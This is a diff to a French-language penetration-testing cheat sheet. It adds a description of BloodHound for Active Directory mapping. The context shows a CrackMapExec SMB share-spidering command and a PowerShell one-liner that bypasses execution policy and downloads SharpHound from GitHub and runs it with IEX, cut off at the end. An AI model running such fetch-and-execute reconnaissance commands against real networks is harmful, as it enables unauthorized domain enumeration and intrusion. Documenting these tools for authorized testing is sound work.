@@ -14,7 +14,7 @@ cme smb -u 'XXX' -p 'XXX' -M spider_plus IP_ADDRESS/MASK
 
 ### PowerShell one-liners
 
-Bloodhound :
+Bloodhound : Cartographie de l'Active Directory. Cette commande permet de collecter les données sur la machine.
 
 ```markdown
 powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound
